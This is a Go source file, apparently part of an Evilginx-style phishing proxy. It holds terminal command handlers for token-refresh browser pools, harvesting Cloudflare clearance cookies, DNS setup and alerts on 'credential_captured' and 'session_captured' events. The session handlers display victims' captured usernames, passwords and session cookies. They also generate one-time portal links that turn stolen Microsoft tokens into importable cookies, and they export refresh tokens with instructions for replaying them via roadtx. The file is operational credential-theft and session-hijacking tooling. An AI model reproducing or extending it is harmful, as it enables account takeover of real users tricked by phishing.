			case "on", "true", "1":
				t.cfg.SetEvilPuppetDebug(true)
				t.p.evilpuppet.SetDebug(true)
			case "off", "false", "0":
				t.cfg.SetEvilPuppetDebug(false)
				t.p.evilpuppet.SetDebug(false)
			default:
				return fmt.Errorf("invalid debug value: %s (use on/off)", args[1])
			}
			return nil
		case "headless":
			switch args[1] {
			case "on", "true", "1":
				t.p.evilpuppet.SetHeadless(true)
				log.Info("EvilPuppet headless mode: on")
			case "off", "false", "0":
				t.p.evilpuppet.SetHeadless(false)
				log.Info("EvilPuppet headless mode: off")
			default:
				return fmt.Errorf("invalid headless value: %s (use on/off)", args[1])
			}
			return nil
		case "pool":
			switch args[1] {
			case "enable":
				if err := t.p.evilpuppet.PoolEnable(); err != nil {
					return fmt.Errorf("pool enable: %v", err)
				}
				log.Info("EvilPuppet pool enabled")
			case "disable":
				t.p.evilpuppet.PoolDisable()
				log.Info("EvilPuppet pool disabled")
			case "status":
				busy, idle, total, enabled, size := t.p.evilpuppet.PoolStatus()
				log.Info("Pool: enabled=%v size=%d active=%d idle=%d total=%d", enabled, size, busy, idle, total)
			case "size":
				return fmt.Errorf("usage: evilpuppet pool size <n> (use 3 args)")
			default:
				return fmt.Errorf("unknown pool subcommand: %s (use enable/disable/status/size/refresh)", args[1])
			}
			return nil
		case "refresh":
			// evilpuppet refresh <phishlet> — refresh a single phishlet's tokens via pool
			phishletName := args[1]
			pl, err := t.cfg.GetPhishlet(phishletName)
			if err != nil {
				return fmt.Errorf("phishlet not found: %s", phishletName)
			}
			epCfg := pl.GetEvilPuppetConfig()
			if epCfg == nil {
				return fmt.Errorf("phishlet '%s' has no evilpuppet config", phishletName)
			}
			if !t.p.evilpuppet.PoolEnabled() {
				return fmt.Errorf("pool is not enabled — use 'evilpuppet pool enable' first")
			}
			phishDomain := t.cfg.PhishletConfig(phishletName).Hostname
			log.Info("[evilpuppet] [refresh] Refreshing tokens for %s on %s via pool...", phishletName, phishDomain)
			go func() {
				result := t.p.evilpuppet.PoolRefresh(epCfg, phishDomain, "", nil)
				if result.Error != nil {
					log.Error("[evilpuppet] [refresh] %s failed: %v", phishletName, result.Error)
				} else {
					log.Success("[evilpuppet] [refresh] %s completed: %d tokens", phishletName, len(result.Tokens))
					for k, v := range result.Tokens {
						log.Info("  token '%s': %s", k, v[:min(len(v), 80)])
					}
				}
			}()
			log.Info("Refresh started in background — use 'evilpuppet collect' to retrieve results")
			return nil
		}
	} else if pn == 3 {
		switch args[0] {
		case "pool":
			if args[1] == "size" {
				size, err := strconv.Atoi(args[2])
				if err != nil || size < 1 || size > 50 {
					return fmt.Errorf("invalid pool size: %s (use 1-50)", args[2])
				}
				t.p.evilpuppet.SetPoolSize(size)
				log.Info("Pool size set to: %d", size)
				return nil
			}
		}
	}
	return fmt.Errorf("invalid syntax: %s", args)
}

func (t *Terminal) handleCfClearance(args []string) error {
	pn := len(args)
	if pn == 0 {
		// Show status
		statuses := t.p.cfClearance.GetStatus()
		if len(statuses) == 0 {
			log.Info("[cf_clearance] no stored clearance cookies")
			log.Info("  usage: cfclearance harvest <domain>")
			log.Info("         cfclearance set <domain> <cookie_value>")
			return nil
		}
		for _, s := range statuses {
			var validStr string
			if s.Valid {
				validStr = fmt.Sprintf("valid (%s remaining)", s.Remaining.Truncate(time.Second))
			} else {
				validStr = "expired"
			}
			log.Info("  %s → %s (harvested %s)", s.Domain, validStr, s.Harvested.Format("2006-01-02 15:04:05"))
		}
		return nil
	}

	switch args[0] {
	case "harvest":
		if pn < 2 {
			return fmt.Errorf("usage: cfclearance harvest <domain>")
		}
		domain := args[1]

		// Use evilpuppet settings for chromium path and display
		chromiumPath := t.cfg.GetEvilPuppetChromiumPath()
		display := t.cfg.GetEvilPuppetDisplay()
		t.p.cfClearance.SetChromiumPath(chromiumPath)
		t.p.cfClearance.SetDisplay(display)

		log.Info("[cf_clearance] starting harvest for %s (this takes ~10s)...", domain)
		go func() {
			if err := t.p.cfClearance.Harvest(domain); err != nil {
				log.Error("[cf_clearance] harvest failed: %v", err)
			}
		}()
		return nil

	case "set":
		if pn < 3 {
			return fmt.Errorf("usage: cfclearance set <domain> <cookie_value>")
		}
		t.p.cfClearance.SetManual(args[1], args[2])
		return nil

	case "clear":
		if pn >= 2 {
			t.p.cfClearance.ClearDomain(args[1])
		} else {
			t.p.cfClearance.Clear()
		}
		return nil

	case "enable":
		t.p.cfClearance.SetEnabled(true)
		log.Info("[cf_clearance] cookie injection enabled")
		return nil

	case "disable":
		t.p.cfClearance.SetEnabled(false)
		log.Info("[cf_clearance] cookie injection disabled")
		return nil

	default:
		return fmt.Errorf("unknown subcommand: %s\nusage: cfclearance [harvest|set|clear|enable|disable|status]", args[0])
	}
}

func (t *Terminal) handleDomains(args []string) error {
	hiblue := color.New(color.FgHiBlue)
	higreen := color.New(color.FgHiGreen)
	yellow := color.New(color.FgYellow)
	hiyellow := color.New(color.FgHiYellow)

	pn := len(args)
	if pn == 0 {
		// List all domains
		domains := t.cfg.GetExternalDomains()
		if len(domains) == 0 {
			log.Info("no domains configured")
			log.Info("use 'domains add <domain>' to add a domain")
			return nil
		}

		cols := []string{"domain", "provider", "status"}
		var rows [][]string
		for _, d := range domains {
			provider := d.Provider
			if provider == "" {
				provider = "internal"
			}

			status := "configured"
			if d.Provider != "internal" && d.Provider != "" {
				if len(d.Credentials) == 0 {
					status = yellow.Sprint("needs credentials")
				} else {
					status = higreen.Sprint("ready")
				}
			}

			row := []string{hiblue.Sprint(d.Domain), hiyellow.Sprint(provider), status}
			rows = append(rows, row)
		}
		log.Printf("\n%s\n", AsTable(cols, rows))
		return nil
	} else if pn == 1 {
		switch args[0] {
		case "help":
			log.Info("Usage:")
			log.Info("  domains                              - list all configured domains")
			log.Info("  domains add <domain>                 - add a new domain (internal DNS)")
			log.Info("  domains delete <domain>              - remove a domain")
			log.Info("  domains config <domain> <provider> [key=value...] - configure DNS provider")
			log.Info("  domains list <domain>                - list DNS records for a domain")
			log.Info("")
			log.Info("Providers: internal, cloudflare, digitalocean")
			log.Info("")
			log.Info("Example:")
			log.Info("  domains add example.com")
			log.Info("  domains config example.com cloudflare api_token=your_api_token")
			return nil
		}
	} else if pn == 2 {
		switch args[0] {
		case "add":
			domain := args[1]
			err := t.cfg.AddExternalDomain(domain, "internal", nil)
			if err != nil {
				return err
			}
			return nil
		case "delete":
			domain := args[1]
			err := t.cfg.RemoveExternalDomain(domain)
			if err != nil {
				return err
			}
			return nil
		case "list":
			domain := args[1]
			domCfg := t.cfg.GetExternalDomain(domain)
			if domCfg == nil {
				return fmt.Errorf("domain %s not found", domain)
			}

			if domCfg.Provider == "internal" || domCfg.Provider == "" {
				log.Info("domain %s uses internal DNS (nameserver on UDP 53)", domain)
				return nil
			}

			// Get DNS provider and list records
			provider, ok := GetExternalDNS().GetProvider(domCfg.Provider)
			if !ok {
				return fmt.Errorf("unknown provider: %s", domCfg.Provider)
			}

			if err := provider.SetCredentials(domCfg.Credentials); err != nil {
				return fmt.Errorf("failed to set credentials: %v", err)
			}

			records, err := provider.ListRecords(domain)
			if err != nil {
				return fmt.Errorf("failed to list records: %v", err)
			}

			if len(records) == 0 {
				log.Info("no DNS records found for %s", domain)
				return nil
			}

			cols := []string{"name", "type", "content", "ttl"}
			var rows [][]string
			for _, r := range records {
				row := []string{r.Name, r.Type, r.Content, strconv.Itoa(r.TTL)}
				rows = append(rows, row)
			}
			log.Printf("\n%s\n", AsTable(cols, rows))
			return nil
		}
	} else if pn >= 3 {
		switch args[0] {
		case "config":
			domain := args[1]
			provider := args[2]

			// Check if provider is valid
			validProviders := GetAvailableDNSProviders()
			found := false
			for _, p := range validProviders {
				if p == provider {
					found = true
					break
				}
			}
			if !found {
				return fmt.Errorf("invalid provider: %s (valid: %v)", provider, validProviders)
			}

			// Parse credentials from remaining arguments
			creds := make(map[string]string)
			for i := 3; i < len(args); i++ {
				parts := strings.SplitN(args[i], "=", 2)
				if len(parts) == 2 {
					creds[parts[0]] = parts[1]
				}
			}

			// Check if domain exists, if not add it
			if t.cfg.GetExternalDomain(domain) == nil {
				if err := t.cfg.AddExternalDomain(domain, provider, creds); err != nil {
					return err
				}
			} else {
				if err := t.cfg.SetExternalDomainProvider(domain, provider, creds); err != nil {
					return err
				}
			}
			return nil
		}
	}
	return fmt.Errorf("invalid syntax: use 'domains help' for usage")
}

func (t *Terminal) handleNotify(args []string) error {
	hiblue := color.New(color.FgHiBlue)
	higreen := color.New(color.FgHiGreen)
	yellow := color.New(color.FgYellow)
	hiyellow := color.New(color.FgHiYellow)
	cyan := color.New(color.FgCyan)
	red := color.New(color.FgRed)
	green := color.New(color.FgGreen)

	pn := len(args)

	if pn == 0 {
		// List all notifiers
		notifiers := t.p.notifier.ListNotifiers()
		if len(notifiers) == 0 {
			log.Info("no notifiers configured")
			log.Info("use 'notify create <name>' to create one")
			return nil
		}

		t.output("%s", hiblue.Sprint("\n notifiers\n"))
		t.output("%s", hiblue.Sprint(strings.Repeat("=", 60)))

		columns := []string{"name", "channel", "enabled", "triggers"}
		var rows [][]string

		for _, n := range notifiers {
			var enabledStr string
			if n.Enabled {
				enabledStr = green.Sprint("yes")
			} else {
				enabledStr = red.Sprint("no")
			}

			channelStr := n.Channel
			if channelStr == "" {
				channelStr = yellow.Sprint("not set")
			}

			// Build triggers string
			var triggers []string
			for _, evt := range AllEventTypes {
				if enabled, ok := n.Triggers[evt]; ok && enabled {
					triggers = append(triggers, evt)
				}
			}
			triggersStr := strings.Join(triggers, ", ")
			if len(triggers) == 0 {
				triggersStr = yellow.Sprint("none")
			}

			rows = append(rows, []string{higreen.Sprint(n.Name), channelStr, enabledStr, triggersStr})
		}
		t.output("\n%s\n", AsTable(columns, rows))
		return nil
	} else if pn >= 1 {
		switch args[0] {
		case "create":
			if pn < 2 {
				return fmt.Errorf("usage: notify create <name>")
			}
			name := args[1]
			n, err := t.p.notifier.CreateNotifier(name)
			if err != nil {
				return err
			}
			// Save to config
			if err := t.cfg.AddNotifier(n); err != nil {
				t.p.notifier.DeleteNotifier(name)
				return err
			}
			log.Success("created notifier: %s", name)
			return nil

		case "delete":
			if pn < 2 {
				return fmt.Errorf("usage: notify delete <name>")
			}
			name := args[1]
			if err := t.p.notifier.DeleteNotifier(name); err != nil {
				return err
			}
			if err := t.cfg.DeleteNotifier(name); err != nil {
				return err
			}
			log.Success("deleted notifier: %s", name)
			return nil

		case "enable":
			if pn < 2 {
				return fmt.Errorf("usage: notify enable <name>")
			}
			name := args[1]
			n := t.p.notifier.GetNotifier(name)
			if n == nil {
				return fmt.Errorf("notifier '%s' not found", name)
			}
			n.Enabled = true
			t.cfg.UpdateNotifier(n)
			log.Success("enabled notifier: %s", name)
			return nil

		case "disable":
			if pn < 2 {
				return fmt.Errorf("usage: notify disable <name>")
			}
			name := args[1]
			n := t.p.notifier.GetNotifier(name)
			if n == nil {
				return fmt.Errorf("notifier '%s' not found", name)
			}
			n.Enabled = false
			t.cfg.UpdateNotifier(n)
			log.Success("disabled notifier: %s", name)
			return nil

		case "view":
			if pn < 2 {
				return fmt.Errorf("usage: notify view <name>")
			}
			name := args[1]
			n := t.p.notifier.GetNotifier(name)
			if n == nil {
				return fmt.Errorf("notifier '%s' not found", name)
			}

			t.output("%s", hiblue.Sprintf("\n notifier: %s\n", n.Name))
			t.output("%s", hiblue.Sprint(strings.Repeat("=", 50)))

			// Basic info
			enabledStr := "no"
			if n.Enabled {
				enabledStr = green.Sprint("yes")
			}
			t.output("\n %s: %s", cyan.Sprint("enabled"), enabledStr)
			t.output("\n %s: %s", cyan.Sprint("channel"), hiyellow.Sprint(n.Channel))

			// Channel-specific config
			switch n.Channel {
			case ChannelWebhook:
				t.output("\n %s: %s", cyan.Sprintf("url"), n.WebhookURL)
				t.output("\n %s: %s", cyan.Sprintf("api_token"), maskString(n.WebhookToken))
				t.output("\n %s: %v", cyan.Sprintf("insecure"), n.WebhookInsecure)
			case ChannelSlack:
				t.output("\n %s: %s", cyan.Sprintf("oauth_token"), maskString(n.SlackOAuthToken))
				t.output("\n %s: %s", cyan.Sprintf("channel_id"), n.SlackChannelID)
			case ChannelPushover:
				t.output("\n %s: %s", cyan.Sprintf("user_key"), maskString(n.PushoverUserKey))
				t.output("\n %s: %s", cyan.Sprintf("api_token"), maskString(n.PushoverAPIToken))
				if n.PushoverSound != "" {
					t.output("\n %s: %s", cyan.Sprintf("sound"), n.PushoverSound)
				}
			case ChannelTelegram:
				t.output("\n %s: %s", cyan.Sprintf("bot_token"), maskString(n.TelegramBotToken))
				t.output("\n %s: %s", cyan.Sprintf("chat_id"), n.TelegramChatID)
			}

			// Triggers
			t.output("\n\n %s:", cyan.Sprintf("triggers"))
			for _, evt := range AllEventTypes {
				enabled := false
				if v, ok := n.Triggers[evt]; ok {
					enabled = v
				}
				statusStr := red.Sprintf("disabled")
				if enabled {
					statusStr = green.Sprintf("enabled")
				}
				t.output("\n   %s: %s", evt, statusStr)
			}

			// Templates
			t.output("\n\n %s:", cyan.Sprint("templates"))
			for _, evt := range AllEventTypes {
				if tmpl, ok := n.Templates[evt]; ok {
					t.output("\n   %s:", higreen.Sprint(evt))
					t.output("\n     subject: %s", tmpl.Subject)
					t.output("\n     body: %s", tmpl.Body)
				}
			}
			t.output("\n")
			return nil

		case "config":
			if pn < 3 {
				return fmt.Errorf("usage: notify config <name> <channel> [key=value ...]")
			}
			name := args[1]
			channel := args[2]

			n := t.p.notifier.GetNotifier(name)
			if n == nil {
				return fmt.Errorf("notifier '%s' not found", name)
			}

			if !stringExists(channel, AllChannelTypes) {
				return fmt.Errorf("invalid channel: %s (valid: %s)", channel, strings.Join(AllChannelTypes, ", "))
			}

			n.Channel = channel

			// Parse key=value pairs
			for i := 3; i < pn; i++ {
				parts := strings.SplitN(args[i], "=", 2)
				if len(parts) != 2 {
					return fmt.Errorf("invalid parameter format: %s (expected key=value)", args[i])
				}
				key, value := parts[0], parts[1]

				switch channel {
				case ChannelWebhook:
					switch key {
					case "url":
						n.WebhookURL = value
					case "api_token":
						n.WebhookToken = value
					case "insecure":
						n.WebhookInsecure = value == "true"
					default:
						return fmt.Errorf("unknown webhook parameter: %s", key)
					}
				case ChannelSlack:
					switch key {
					case "oauth_token":
						n.SlackOAuthToken = value
					case "channel_id":
						n.SlackChannelID = value
					default:
						return fmt.Errorf("unknown slack parameter: %s", key)
					}
				case ChannelPushover:
					switch key {
					case "user_key":
						n.PushoverUserKey = value
					case "api_token":
						n.PushoverAPIToken = value
					case "sound":
						n.PushoverSound = value
					default:
						return fmt.Errorf("unknown pushover parameter: %s", key)
					}
				case ChannelTelegram:
					switch key {
					case "bot_token":
						n.TelegramBotToken = value
					case "chat_id":
						n.TelegramChatID = value
					default:
						return fmt.Errorf("unknown telegram parameter: %s", key)
					}
				}
			}

			t.cfg.UpdateNotifier(n)
			log.Success("configured notifier '%s' with channel: %s", name, channel)
			return nil

		case "test":
			if pn < 3 {
				return fmt.Errorf("usage: notify test <name> <event>")
			}
			name := args[1]
			event := args[2]

			if !stringExists(event, AllEventTypes) {
				return fmt.Errorf("invalid event: %s (valid: %s)", event, strings.Join(AllEventTypes, ", "))
			}

			log.Info("testing notifier '%s' with event: %s", name, event)
			if err := t.p.notifier.Test(name, event); err != nil {
				return err
			}
			log.Success("test notification sent successfully")
			return nil

		case "set":
			if pn < 4 {
				return fmt.Errorf("usage: notify set <name> trigger|template <event> <enable|disable|subject|body> [value]")
			}
			name := args[1]
			settingType := args[2]

			// Handle 'default' specially
			isDefault := name == "default"

			switch settingType {
			case "trigger":
				if pn < 5 {
					return fmt.Errorf("usage: notify set <name> trigger <event> <enable|disable>")
				}
				event := args[3]
				action := args[4]

				if !stringExists(event, AllEventTypes) {
					return fmt.Errorf("invalid event: %s", event)
				}

				enabled := action == "enable"

				if isDefault {
					if err := t.p.notifier.SetDefaultTrigger(event, enabled); err != nil {
						return err
					}
					// Save defaults
					_, defaults := t.p.notifier.ExportNotifiers()
					t.cfg.SetNotifierDefaults(defaults)
					t.cfg.SaveNotifiersConfig()
				} else {
					if err := t.p.notifier.SetTrigger(name, event, enabled); err != nil {
						return err
					}
					n := t.p.notifier.GetNotifier(name)
					t.cfg.UpdateNotifier(n)
				}
				log.Success("trigger %s set to %s for %s", event, action, name)
				return nil

			case "template":
				if pn < 6 {
					return fmt.Errorf("usage: notify set <name> template <event> <subject|body> <value>")
				}
				event := args[3]
				field := args[4]
				value := strings.Join(args[5:], " ")

				if !stringExists(event, AllEventTypes) {
					return fmt.Errorf("invalid event: %s", event)
				}

				var subject, body string
				if field == "subject" {
					subject = value
				} else if field == "body" {
					body = value
				} else {
					return fmt.Errorf("invalid field: %s (use 'subject' or 'body')", field)
				}

				if isDefault {
					if err := t.p.notifier.SetDefaultTemplate(event, subject, body); err != nil {
						return err
					}
					_, defaults := t.p.notifier.ExportNotifiers()
					t.cfg.SetNotifierDefaults(defaults)
					t.cfg.SaveNotifiersConfig()
				} else {
					if err := t.p.notifier.SetTemplate(name, event, subject, body); err != nil {
						return err
					}
					n := t.p.notifier.GetNotifier(name)
					t.cfg.UpdateNotifier(n)
				}
				log.Success("template %s for event %s updated", field, event)
				return nil
			}
			return fmt.Errorf("invalid setting type: %s (use 'trigger' or 'template')", settingType)

		case "reset":
			if pn < 2 {
				return fmt.Errorf("usage: notify reset <name|default>")
			}
			name := args[1]

			if name == "default" {
				t.p.notifier.ResetDefaults()
				_, defaults := t.p.notifier.ExportNotifiers()
				t.cfg.SetNotifierDefaults(defaults)
				t.cfg.SaveNotifiersConfig()
				log.Success("reset default notifier settings to factory defaults")
			} else {
				if err := t.p.notifier.ResetNotifier(name); err != nil {
					return err
				}
				n := t.p.notifier.GetNotifier(name)
				t.cfg.UpdateNotifier(n)
				log.Success("reset notifier '%s' to default settings", name)
			}
			return nil

		case "help":
			t.output("%s", hiblue.Sprint("\nEvent Notification Commands:\n"))
			t.output("%s", hiblue.Sprint(strings.Repeat("=", 60)))
			t.output("\n  %s - %s", hiyellow.Sprintf("notify"), "list all notifiers")
			t.output("\n  %s - %s", hiyellow.Sprintf("notify create <name>"), "create a new notifier")
			t.output("\n  %s - %s", hiyellow.Sprintf("notify delete <name>"), "delete a notifier")
			t.output("\n  %s - %s", hiyellow.Sprintf("notify enable <name>"), "enable a notifier")
			t.output("\n  %s - %s", hiyellow.Sprintf("notify disable <name>"), "disable a notifier")
			t.output("\n  %s - %s", hiyellow.Sprintf("notify view <name>"), "view notifier details")
			t.output("\n  %s - %s", hiyellow.Sprintf("notify config <name> <channel> [key=value ...]"), "configure notifier channel")
			t.output("\n  %s - %s", hiyellow.Sprintf("notify test <name> <event>"), "test a notifier")
			t.output("\n  %s - %s", hiyellow.Sprintf("notify set <name> trigger <event> <enable|disable>"), "set event trigger")
			t.output("\n  %s - %s", hiyellow.Sprintf("notify set <name> template <event> <subject|body> <value>"), "set event template")
			t.output("\n  %s - %s", hiyellow.Sprintf("notify reset <name|default>"), "reset notifier or defaults")
			t.output("\n\n%s", cyan.Sprintf("Channels: webhook, slack, pushover, telegram"))
			t.output("\n%s", cyan.Sprintf("Events: lure_clicked, lure_landed, credential_captured, session_captured"))
			t.output("\n\n%s", higreen.Sprintf("Examples:"))
			t.output("\n  notify create alerts")
			t.output("\n  notify config alerts webhook url=https://example.com/hook api_token=SECRET")
			t.output("\n  notify config alerts telegram bot_token=123456:ABC chat_id=987654")
			t.output("\n  notify config alerts slack oauth_token=xoxb-xxx channel_id=CXXX")
			t.output("\n  notify test alerts session_captured")
			t.output("\n  notify set alerts trigger lure_clicked disable")
			t.output("\n")
			return nil
		}
	}

	return fmt.Errorf("invalid syntax: use 'notify help' for usage")
}

// maskString masks a string for display (shows first/last 4 chars)
func maskString(s string) string {
	if s == "" {
		return "(not set)"
	}
	if len(s) <= 8 {
		return strings.Repeat("*", len(s))
	}
	return s[:4] + strings.Repeat("*", len(s)-8) + s[len(s)-4:]
}

func (t *Terminal) handleProxy(args []string) error {
	pn := len(args)
	if pn == 0 {
		var proxy_enabled string = "no"
		if t.cfg.proxyConfig.Enabled {
			proxy_enabled = "yes"
		}

		keys := []string{"enabled", "type", "address", "port", "username", "password"}
		vals := []string{proxy_enabled, t.cfg.proxyConfig.Type, t.cfg.proxyConfig.Address, strconv.Itoa(t.cfg.proxyConfig.Port), t.cfg.proxyConfig.Username, t.cfg.proxyConfig.Password}
		log.Printf("\n%s\n", AsRows(keys, vals))
		return nil
	} else if pn == 1 {
		switch args[0] {
		case "enable":
			err := t.p.setProxy(true, t.p.cfg.proxyConfig.Type, t.p.cfg.proxyConfig.Address, t.p.cfg.proxyConfig.Port, t.p.cfg.proxyConfig.Username, t.p.cfg.proxyConfig.Password)
			if err != nil {
				return err
			}
			t.cfg.EnableProxy(true)
			return nil
		case "disable":
			err := t.p.setProxy(false, t.p.cfg.proxyConfig.Type, t.p.cfg.proxyConfig.Address, t.p.cfg.proxyConfig.Port, t.p.cfg.proxyConfig.Username, t.p.cfg.proxyConfig.Password)
			if err != nil {
				return err
			}
			t.cfg.EnableProxy(false)
			return nil
		}
	} else if pn == 2 {
		switch args[0] {
		case "type":
			if t.cfg.proxyConfig.Enabled {
				return fmt.Errorf("please disable the proxy before making changes to its configuration")
			}
			t.cfg.SetProxyType(args[1])
			return nil
		case "address":
			if t.cfg.proxyConfig.Enabled {
				return fmt.Errorf("please disable the proxy before making changes to its configuration")
			}
			t.cfg.SetProxyAddress(args[1])
			return nil
		case "port":
			if t.cfg.proxyConfig.Enabled {
				return fmt.Errorf("please disable the proxy before making changes to its configuration")
			}
			port, err := strconv.Atoi(args[1])
			if err != nil {
				return err
			}
			t.cfg.SetProxyPort(port)
			return nil
		case "username":
			if t.cfg.proxyConfig.Enabled {
				return fmt.Errorf("please disable the proxy before making changes to its configuration")
			}
			t.cfg.SetProxyUsername(args[1])
			return nil
		case "password":
			if t.cfg.proxyConfig.Enabled {
				return fmt.Errorf("please disable the proxy before making changes to its configuration")
			}
			t.cfg.SetProxyPassword(args[1])
			return nil
		}
	}
	return fmt.Errorf("invalid syntax: %s", args)
}

func (t *Terminal) handleSessions(args []string) error {
	lblue := color.New(color.FgHiBlue)
	dgray := color.New(color.FgHiBlack)
	lgreen := color.New(color.FgHiGreen)
	yellow := color.New(color.FgYellow)
	lyellow := color.New(color.FgHiYellow)
	lred := color.New(color.FgHiRed)
	cyan := color.New(color.FgCyan)
	white := color.New(color.FgHiWhite)

	pn := len(args)
	if pn == 0 {
		cols := []string{"id", "phishlet", "username", "password", "tokens", "remote ip", "time"}
		sessions, err := t.db.ListSessions()
		if err != nil {
			return err
		}
		if len(sessions) == 0 {
			log.Info("no saved sessions found")
			return nil
		}
		var rows [][]string
		for _, s := range sessions {
			tcol := dgray.Sprint("none")
			if len(s.CookieTokens) > 0 || len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0 {
				tcol = lgreen.Sprint("captured")
			} else if s.Custom["dc_refresh_token"] != "" || s.Custom["dc_access_token"] != "" {
				tcol = cyan.Sprint("dc_tokens")
			}
			row := []string{strconv.Itoa(s.Id), lred.Sprint(s.Phishlet), lblue.Sprint(truncateString(s.Username, 24)), lblue.Sprint(truncateString(s.Password, 24)), tcol, yellow.Sprint(s.RemoteAddr), time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04")}
			rows = append(rows, row)
		}
		log.Printf("\n%s\n", AsTable(cols, rows))
		return nil
	} else if pn == 1 {
		id, err := strconv.Atoi(args[0])
		if err != nil {
			return err
		}
		sessions, err := t.db.ListSessions()
		if err != nil {
			return err
		}
		if len(sessions) == 0 {
			log.Info("no saved sessions found")
			return nil
		}
		s_found := false
		for _, s := range sessions {
			if s.Id == id {
				_, err := t.cfg.GetPhishlet(s.Phishlet)
				if err != nil {
					log.Error("%v", err)
					break
				}

				s_found = true
				tcol := dgray.Sprintf("empty")
				if len(s.CookieTokens) > 0 || len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0 {
					tcol = lgreen.Sprintf("captured")
				} else if s.Custom["dc_refresh_token"] != "" || s.Custom["dc_access_token"] != "" {
					tcol = cyan.Sprintf("dc_tokens")
				}

				keys := []string{"id", "phishlet", "username", "password", "tokens", "landing url", "user-agent", "remote ip", "create time", "update time"}
				vals := []string{strconv.Itoa(s.Id), lred.Sprint(s.Phishlet), lblue.Sprint(s.Username), lblue.Sprint(s.Password), tcol, yellow.Sprint(s.LandingURL), dgray.Sprint(s.UserAgent), yellow.Sprint(s.RemoteAddr), dgray.Sprint(time.Unix(s.CreateTime, 0).Format("2006-01-02 15:04")), dgray.Sprint(time.Unix(s.UpdateTime, 0).Format("2006-01-02 15:04"))}
				log.Printf("\n%s\n", AsRows(keys, vals))

				if len(s.Custom) > 0 {
					tkeys := []string{}
					tvals := []string{}

					for k, v := range s.Custom {
						tkeys = append(tkeys, k)
						tvals = append(tvals, cyan.Sprint(v))
					}

					log.Printf("[ %s ]\n%s\n", white.Sprint("custom"), AsRows(tkeys, tvals))
				}

				if len(s.CookieTokens) > 0 || len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0 {
					if len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0 {
						//var str_tokens string

						tkeys := []string{}
						tvals := []string{}

						for k, v := range s.BodyTokens {
							tkeys = append(tkeys, k)
							tvals = append(tvals, white.Sprint(v))
						}
						for k, v := range s.HttpTokens {
							tkeys = append(tkeys, k)
							tvals = append(tvals, white.Sprint(v))
						}

						log.Printf("[ %s ]\n%s\n", lgreen.Sprint("tokens"), AsRows(tkeys, tvals))
					}
					if len(s.CookieTokens) > 0 {
						json_tokens := t.cookieTokensToJSON(s.CookieTokens)
						log.Printf("[ %s ]\n%s\n\n", lyellow.Sprint("cookies"), json_tokens)
						log.Printf("%s %s %s %s%s\n\n", dgray.Sprint("(use"), cyan.Sprint("StorageAce"), dgray.Sprint("extension to import the cookies:"), white.Sprint("https://chromewebstore.google.com/detail/storageace/cpbgcbmddckpmhfbdckeolkkhkjjmplo"), dgray.Sprint(")"))
					}
				}
				break
			}
		}
		if !s_found {
			return fmt.Errorf("id %d not found", id)
		}
		return nil
	} else if pn == 2 {
		switch args[0] {
		case "delete":
			if args[1] == "all" {
				sessions, err := t.db.ListSessions()
				if err != nil {
					return err
				}
				if len(sessions) == 0 {
					break
				}
				for _, s := range sessions {
					err = t.db.DeleteSessionById(s.Id)
					if err != nil {
						log.Warning("delete: %v", err)
					} else {
						log.Info("deleted session with ID: %d", s.Id)
					}
				}
				t.db.Flush()
				return nil
			} else {
				rc := strings.Split(args[1], ",")
				for _, pc := range rc {
					pc = strings.TrimSpace(pc)
					rd := strings.Split(pc, "-")
					if len(rd) == 2 {
						b_id, err := strconv.Atoi(strings.TrimSpace(rd[0]))
						if err != nil {
							log.Error("delete: %v", err)
							break
						}
						e_id, err := strconv.Atoi(strings.TrimSpace(rd[1]))
						if err != nil {
							log.Error("delete: %v", err)
							break
						}
						for i := b_id; i <= e_id; i++ {
							err = t.db.DeleteSessionById(i)
							if err != nil {
								log.Warning("delete: %v", err)
							} else {
								log.Info("deleted session with ID: %d", i)
							}
						}
					} else if len(rd) == 1 {
						b_id, err := strconv.Atoi(strings.TrimSpace(rd[0]))
						if err != nil {
							log.Error("delete: %v", err)
							break
						}
						err = t.db.DeleteSessionById(b_id)
						if err != nil {
							log.Warning("delete: %v", err)
						} else {
							log.Info("deleted session with ID: %d", b_id)
						}
					}
				}
				t.db.Flush()
				return nil
			}
		default:
			// Handle: sessions <id> <subcommand>
			id, err := strconv.Atoi(args[0])
			if err == nil {
				switch args[1] {
				case "portal":
					// Generate a portal link for the session - exchanges tokens for cookies
					portalToken, err := t.p.tokenPortal.GeneratePortalLink(id)
					if err != nil {
						return fmt.Errorf("portal: %v", err)
					}

					// Build the portal URL using the phishing domain
					portalPath := "/p/" + portalToken
					phishDomain := ""
					for _, pl := range t.cfg.phishlets {
						if t.cfg.IsSiteEnabled(pl.Name) {
							if len(pl.proxyHosts) > 0 {
								phishDomain = pl.proxyHosts[0].phish_subdomain + "." + t.cfg.general.Domain
								break
							}
						}
					}
					if phishDomain == "" {
						phishDomain = t.cfg.general.Domain
					}

					portalURL := "https://" + phishDomain + portalPath

					t.output("")
					t.output("  %s %s", white.Sprint("Portal URL:"), lgreen.Sprint(portalURL))
					t.output("")
					t.output("  %s Open this URL in your browser to access the portal page.", dgray.Sprint("→"))
					t.output("  %s The portal extracts Microsoft session cookies from the captured tokens.", dgray.Sprint("→"))
					t.output("  %s Import the cookies using StorageAce → navigate to any Microsoft 365 service.", dgray.Sprint("→"))
					t.output("  %s This link expires in 30 minutes and is one-time use.", yellow.Sprint("⚠"))
					t.output("")
					return nil

				case "export":
					// Export raw tokens for a session
					tokens, err := t.p.tokenPortal.ExportSessionTokens(id)
					if err != nil {
						return fmt.Errorf("export: %v", err)
					}

					t.output("")
					t.output("  [ %s ]", white.Sprint("Session #"+args[0]+" - Exported Tokens"))
					t.output("")

					tkeys := []string{}
					tvals := []string{}
					for k, v := range tokens {
						tkeys = append(tkeys, k)
						if k == "dc_refresh_token" || k == "dc_access_token" || k == "dc_id_token" {
							tvals = append(tvals, white.Sprint(v))
						} else {
							tvals = append(tvals, cyan.Sprint(v))
						}
					}
					log.Printf("\n%s\n", AsRows(tkeys, tvals))

					// Print usage hints
					t.output("  %s Copy the refresh token and use with:", dgray.Sprint("→"))
					t.output("    %s roadtx auth --refresh-token <token>", cyan.Sprint("•"))
					t.output("    %s mailbox.html (paste in token field)", cyan.Sprint("•"))
					t.output("    %s sessions %d portal (generate cookie import page)", cyan.Sprint("•"), id)
					t.output("")
					return nil
				}
			}
		}
	}
	return fmt.Errorf("invalid syntax: %s", args)
}

